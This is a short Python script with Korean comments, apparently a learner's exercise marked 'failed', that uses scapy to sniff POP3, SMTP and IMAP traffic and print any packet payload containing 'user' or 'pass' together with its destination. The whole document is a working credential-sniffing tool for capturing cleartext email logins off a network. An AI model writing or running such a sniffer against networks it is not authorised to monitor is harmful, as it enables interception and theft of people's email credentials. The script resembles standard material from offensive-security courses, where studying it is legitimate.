#실패
from scapy.all import sniff, TCP, IP

# 패킷 콜백 함수
def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    # 도청 기능 작동 : 오직 전자우편 관련된 프로토콜 110(POP3), 143(IMAP), 25(SMTP)만 도청 수행
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',prn=packet_callback, store=0)


if __name__ == '__main__':
    main()